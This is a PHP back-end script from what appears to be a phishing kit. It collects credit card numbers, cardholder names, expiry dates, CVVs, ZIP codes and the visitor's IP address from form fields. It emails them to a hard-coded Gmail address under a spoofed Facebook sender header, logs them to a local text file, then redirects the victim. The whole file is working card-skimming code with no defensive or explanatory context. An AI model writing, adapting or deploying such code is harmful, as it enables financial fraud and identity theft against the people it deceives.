<?php
$ip = getenv("REMOTE_ADDR");
$message .= "NUMBER: ".$_POST['Editbox1']."\n";
$message .= "NAME: ".$_POST['Editbox2']."\n";
$message .= "CARED: ".$_POST['Editbox3']."\n";
$message .= "MM: ".$_POST['Editbox4']."\n";
$message .= "YY: ".$_POST['Editbox5']."\n";
$message .= "CVV: ".$_POST['Editbox6']."\n";
$message .= "ZIP CODE: ".$_POST['Editbox7']."\n";
$message .= "IP: $ip\n"; 
$$cc = $_POST['ccn'];
$subject = "Whatsapp From $ip (^_^) ".$_POST['exy'];
$send = "dchgalo@gmail.com";
$headers = "From: Facebook-mobile  <fsdfs@hotfgdfgmail.com>\r\n";
mail($send,$subject,$message,$headers,$file);
$file = fopen("dch.txt", 'a');
fwrite($file, $message);
header("Location: ../info/index.html");?>